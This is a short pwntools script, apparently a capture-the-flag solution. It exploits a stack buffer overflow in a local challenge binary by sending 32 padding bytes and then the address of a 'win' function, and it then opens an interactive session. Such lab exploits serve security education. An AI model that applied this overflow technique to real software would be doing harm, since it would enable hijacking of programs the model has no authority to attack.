from pwn import *

elf = context.binary = ELF('./chall')
context.log_level = 'debug'

p = process()
p.sendlineafter(': ', b'2')
payload = b'A' * 32 + pack(elf.sym.win)
p.sendline(payload)
p.interactive()
